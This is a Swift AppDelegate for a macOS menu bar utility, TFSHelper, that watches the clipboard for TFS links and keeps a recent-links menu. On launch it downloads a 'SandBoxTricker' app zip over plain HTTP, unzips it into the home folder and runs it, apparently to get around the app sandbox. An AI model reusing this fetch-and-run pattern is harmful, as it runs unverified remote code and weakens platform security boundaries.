//
//  AppDelegate.swift
//  TFSHelper
//
//  Created by 杨萧玉 on 15/11/26.
//  Copyright © 2015年 杨萧玉. All rights reserved.
//

import Cocoa
import ServiceManagement

@NSApplicationMain
class AppDelegate: NSObject, NSApplicationDelegate, NSMenuDelegate {
    let launcherAppIdentifier = "com.yulingtianxia.TFSHelperLauncher"
    let sandBoxTricker = "com.yulingtianxia.SandBoxTricker"
    let statusItem: NSStatusItem = NSStatusBar.system().statusItem(withLength: NSVariableStatusItemLength)
    let mainMenu: NSMenu = NSMenu()
    
    var autoCatch: Bool = true {
        didSet {
            if autoCatch {
                switchAutoCatchItem.title = "自动连接开启中"
            }
            else {
                switchAutoCatchItem.title = "自动连接已关闭"
            }
        }
    }
    var autoLaunch: Bool = true {
        didSet {
            if autoLaunch {
                switchAutoLaunchItem.title = "登录时启动"
            }
            else {
                switchAutoLaunchItem.title = "登录时不启动"
            }
            SMLoginItemSetEnabled(launcherAppIdentifier as CFString, autoLaunch)
        }
    }
    let openLocationItem = NSMenuItem(title: "打开链接", action: #selector(AppDelegate.connect(_:)), keyEquivalent: "")
    let quitItem = NSMenuItem(title: "退出", action: #selector(Process.terminate), keyEquivalent: "")
    let switchAutoCatchItem = NSMenuItem(title: "自动连接开启中", action: #selector(AppDelegate.switchAutoCatch), keyEquivalent: "")
    let switchAutoLaunchItem = NSMenuItem(title: "登录时启动", action: #selector(AppDelegate.switchAutoLaunch) , keyEquivalent: "")
    let recentLinksItem = NSMenuItem()
    let recentLinksMenu = NSMenu()
    let userDefaults = UserDefaults.standard
    
    func applicationDidFinishLaunching(_ aNotification: Notification) {
        // Insert code here to initialize your application
        recentLinksMenu.delegate = self
        recentLinksItem.title = "常用链接"
        recentLinksMenu.autoenablesItems = false
        recentLinksItem.submenu = recentLinksMenu
        
        mainMenu.delegate = self
        mainMenu.addItem(openLocationItem)
        mainMenu.addItem(recentLinksItem)
        mainMenu.addItem(switchAutoCatchItem)
        mainMenu.addItem(switchAutoLaunchItem)
        mainMenu.addItem(quitItem)
        
        statusItem.button?.image = NSImage(named: "TFSmenu")
        statusItem.menu = mainMenu
        
        recentUseLinks = LRUCache <String, String>()
        let linksData = NSKeyedArchiver.archivedData(withRootObject: recentUseLinks)
        
        userDefaults.register(defaults: ["autoCatch":autoCatch])
        userDefaults.register(defaults: ["autoLaunch":autoLaunch])
        userDefaults.register(defaults: ["recentUseLinks":linksData])
        
        autoCatch = userDefaults.bool(forKey: "autoCatch")
        autoLaunch = userDefaults.bool(forKey: "autoLaunch")
        
        if let data = userDefaults.object(forKey: "recentUseLinks") as? Data {
            recentUseLinks = NSKeyedUnarchiver.unarchiveObject(with: data) as! LRUCache <String, String>
        }
        recentUseLinks.countLimit = 5
        
        Timer.scheduledTimer(timeInterval: 0.25, target: self, selector: #selector(AppDelegate.pollPasteboard(_:)), userInfo: nil, repeats: true)
        
        var startedAtLogin = false
        var sandBoxTrickerStarted = false
        for app in NSWorkspace.shared().runningApplications {
            if app.bundleIdentifier == launcherAppIdentifier {
                startedAtLogin = true
            }
            if app.bundleIdentifier == sandBoxTricker {
                sandBoxTrickerStarted = true
            }
        }
        
        if startedAtLogin {
            DistributedNotificationCenter.default().post(name: NSNotification.Name("killLauncher"), object: Bundle.main.bundleIdentifier!)
        }
        
        if !sandBoxTrickerStarted {
            let path = NSHomeDirectory()
            
            var components = (path as NSString).pathComponents
            
            if let url = URL(string: "http://7ni3rk.com1.z0.glb.clouddn.com/SandBoxTricker.app.zip") {
                let downloadtask = URLSession(configuration: URLSessionConfiguration.default).downloadTask(with: url, completionHandler: { (tempURL, response, error) in
                    if error != nil {
                        print("can't download SandBoxTricker! \(error?.localizedDescription)")
                    }
                    if tempURL !=  nil {
                        unzip(path, zipFile: tempURL!.path)
                        
                        components.append("SandBoxTricker.app")
                        components.append("Contents")
                        components.append("MacOS")
                        components.append("SandBoxTricker") //sandbox tricker app name
                        
                        let appPath = NSString.path(withComponents: components)
                        
                        NSWorkspace.shared().launchApplication(appPath)
                    }
                })
                downloadtask.resume()
            }
            
        }
    }
    
    func applicationWillTerminate(_ aNotification: Notification) {
        // Insert code here to tear down your application
        userDefaults.set(autoCatch, forKey: "autoCatch")
        userDefaults.set(autoLaunch, forKey: "autoLaunch")
        let linksData = NSKeyedArchiver.archivedData(withRootObject: recentUseLinks)
        userDefaults.set(linksData, forKey: "recentUseLinks")
        DistributedNotificationCenter.default().post(name: NSNotification.Name("killSandBoxTricker"), object: Bundle.main.bundleIdentifier!)
    }
    
    func applicationShouldTerminateAfterLastWindowClosed(_ sender: NSApplication) -> Bool {
        return false
    }
    
    func pollPasteboard(_ timer: Timer) {
        if !autoCatch {
            return
        }
        let currentChangeCount = NSPasteboard.general().changeCount
        if currentChangeCount == previousChangeCount {
            return
        }
        handlePasteboard()
    }
    
    func connect(_ sender: NSStatusBarButton) {
        handlePasteboard()
    }
    
    func switchAutoCatch() {
        autoCatch = !autoCatch
    }
    
    func switchAutoLaunch() {
        autoLaunch = !autoLaunch
    }
    
    func terminate() {
        NSApp.terminate(nil)
    }
    
    // MARK: NSMenuDelegate
    
    func menuWillOpen(_ menu: NSMenu) {
        if menu == mainMenu {
            openLocationItem.isHidden = false
            guard let _ = catchTFSLocation() else {
                openLocationItem.isHidden = true
                return
            }
        }
        if menu == recentLinksMenu {
            generateLinkItems(menu)
        }
    }
    
    // 生成 MenuItem 数组
    func generateLinkItems(_ menu: NSMenu) {
        menu.removeAllItems()
        for key in recentUseLinks {
            let item = NSMenuItem(title: recentUseLinks[key]!, action: #selector(AppDelegate.handleSelectLink(_:)), keyEquivalent: "")
            menu.addItem(item)
        }
        let clearItem = NSMenuItem(title: "清空列表", action: #selector(AppDelegate.clearLinks), keyEquivalent: "")
        if menu.numberOfItems != 0 {
            let separator = NSMenuItem.separator()
            separator.isEnabled = false
            menu.addItem(separator)
        }
        else {
            clearItem.isEnabled = false
        }
        menu.addItem(clearItem)
    }
    
    // 处理点击link子菜单事件
    func handleSelectLink(_ item: NSMenuItem) {
        let index = recentLinksMenu.index(of: item)
        writePasteboard(recentUseLinks[index])
        if !autoCatch {
            handlePasteboard()
        }
    }
    
    // 处理清空 link 菜单事件
    func clearLinks() {
        recentUseLinks.cleanCache()
    }
}
